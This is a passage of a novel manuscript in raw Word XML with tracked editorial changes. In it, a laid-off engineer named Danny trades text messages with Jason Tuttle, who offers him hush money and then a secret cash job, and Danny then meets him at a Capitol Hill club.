        <w:t>Well I certainly wouldn't want THAT to happen, now would I?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Especially not after you manipulated me into throwing away six years of my life.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>It's not throwing away! You got paid every month! You had the means to eat and pay rent. You give us your brain, we give you money. That's how it works.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Fuck. You think this is about MONEY?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Is it?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Because if it is, I can be persuasive.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I can make it profitable for you to just forget this entire conversation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You're obviously going to need some extra cash soon anyway, so it really would be in your best interest.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Are you serious?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Are you trying to BUY MY SILENCE?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>LOL! This is fucking great! I've never been bribed before!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Please don't use that terminology.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Do we have a deal?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You're a fucking idiot.</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br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="008443E5" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="183" w:author="TextVet" w:date="2016-03-15T12:04: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Danny leaned against the wall and </w:t>
      </w:r>
      <w:ins w:id="184" w:author="TextVet" w:date="2016-03-15T12:07:00Z">
        <w:r w:rsidR="000B09E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>slid</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="185" w:author="TextVet" w:date="2016-03-15T12:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000B09E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>let</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hi</w:t>
      </w:r>
      <w:ins w:id="186" w:author="TextVet" w:date="2016-03-15T12:05:00Z">
        <w:r w:rsidR="00BB6052">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>s shoulder</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="187" w:author="TextVet" w:date="2016-03-15T12:06:00Z">
        <w:r w:rsidR="00BB6052">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="188" w:author="TextVet" w:date="2016-03-15T12:05:00Z">
        <w:r w:rsidR="00BB6052">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>blades</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="189" w:author="TextVet" w:date="2016-03-15T12:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BB6052">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>mself sink</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="190" w:author="TextVet" w:date="2016-03-15T12:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000B09E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sl</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="191" w:author="TextVet" w:date="2016-03-15T12:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BB6052">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>owly</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="192" w:author="TextVet" w:date="2016-03-15T12:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000B09E7">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 xml:space="preserve">down </w:t>
      </w:r>
      <w:ins w:id="193" w:author="TextVet" w:date="2016-03-15T12:07:00Z">
        <w:r w:rsidR="000B09E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">it </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">until he sat on the floor, his head dangling </w:t>
      </w:r>
      <w:del w:id="194" w:author="TextVet" w:date="2016-03-15T12:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00747345">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">limply </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">between his knees. A silent minute </w:t>
      </w:r>
      <w:ins w:id="195" w:author="TextVet" w:date="2016-03-15T12:04:00Z">
        <w:r w:rsidR="0005347F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>groun</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="196" w:author="TextVet" w:date="2016-03-15T12:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0005347F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>passe</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:ins w:id="197" w:author="TextVet" w:date="2016-03-15T12:04:00Z">
        <w:r w:rsidR="0005347F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> past</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="008443E5" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="198" w:author="TextVet" w:date="2016-03-15T12:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Then </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="199" w:author="TextVet" w:date="2016-03-15T12:04:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="008443E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="200" w:author="TextVet" w:date="2016-03-15T12:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">is </w:t>
      </w:r>
      <w:del w:id="201" w:author="TextVet" w:date="2016-03-15T12:05:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00562EB8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>cell</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>phone vibrated again in his hand.</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C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I know it's not about the money, Danny. I'm sorry for implying that that's all it was.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Believe it or not, I've been in your shoes. I know firsthand that there are other things at stake. Deeper things.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Dignity. Pride. A sense of accomplishment. Being valued.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>So here's what I'm thinking.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Remember I said how all of us in the investment group each have other projects of our own?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I personally have one very hot iron in the fire.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>It's high-priority for me, it's urgent, and it's EXTREMELY sensitive. I already have personnel selected, but none of my current picks is suitable for the role of lead engineer. The same role you've proven yourself in for the last six years. Now that I think about it, this unfortunate situation could potentially work out very well for both of us. I could really use a man of your talents.</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br/>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sat </w:t>
      </w:r>
      <w:ins w:id="202" w:author="TextVet" w:date="2016-03-15T12:09:00Z">
        <w:r w:rsidR="00D46C67">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>transfixed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="203" w:author="TextVet" w:date="2016-03-15T12:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D46C67">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>on the floor</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the messages rolled in. He </w:t>
      </w:r>
      <w:ins w:id="204" w:author="TextVet" w:date="2016-03-15T12:09:00Z">
        <w:r w:rsidR="00437237">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>scanned</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="205" w:author="TextVet" w:date="2016-03-15T12:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00437237">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>looked around</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the kitchen. The table, the coffee pot, the fridge, the OSHA notices, the community corkboard with postings from his coworkers looking for babysitters or carpool partners. In a week, it would all be gone.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 certainly wasn’t the first dot-com he’d seen die with a whimper. And, though it stabbed him through the heart </w:t>
      </w:r>
      <w:del w:id="206" w:author="TextVet" w:date="2016-03-15T12:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E56DEA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="207" w:author="TextVet" w:date="2016-03-15T12:10:00Z">
        <w:r w:rsidR="00A34641">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>consider</w:t>
        </w:r>
        <w:r w:rsidR="00E56DEA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="208" w:author="TextVet" w:date="2016-03-15T12:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A34641">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>think of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it, it probably wouldn’t be the last.</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873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Are you offering me a job?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You're yanking one job out from under me, and offering me another?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Yes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Not so much a job in the sense of W-2s and dental benefits and all that. This is more of a one-off consulting project. With cash payment.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Instead of a bribe? So basically you still want to shut me up with money, but this way I have to work for it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Basically.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You know...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I don't know why that should make me feel better.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>But it does.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Give me details?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I can't discuss it over phone or email.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Do you know the Mercury club on Capitol Hill?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Meet me in an hour. I'll tell you all about it.</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F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>3</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Mercury was adorned with grinning gargoyles</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and occult symbols. Mannequins stood in corners, as though the Medusa sculpture by the door had turned patrons to plastic. Young people with bits of metal in their skin sipped colorful drinks to the buzzing, beeping background music.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walked in carrying a Claymore tote bag full of electronic junk. Wires and tubes p</w:t>
      </w:r>
      <w:ins w:id="209" w:author="TextVet" w:date="2016-03-15T12:14:00Z">
        <w:r w:rsidR="00B502A0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>rotruded</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="210" w:author="TextVet" w:date="2016-03-15T12:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B502A0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>oked out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the top. He spotted Jason Tuttle alone at a table.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take it you haven’t been home?” Jason said, eyeing the suit Danny was still wearing from the afternoon’s presentation.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hung out in the office after our chat,” Danny </w:t>
      </w:r>
      <w:del w:id="211" w:author="TextVet" w:date="2016-03-15T12:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D73AE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="212" w:author="TextVet" w:date="2016-03-15T12:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D73AE">
          <w:rPr>
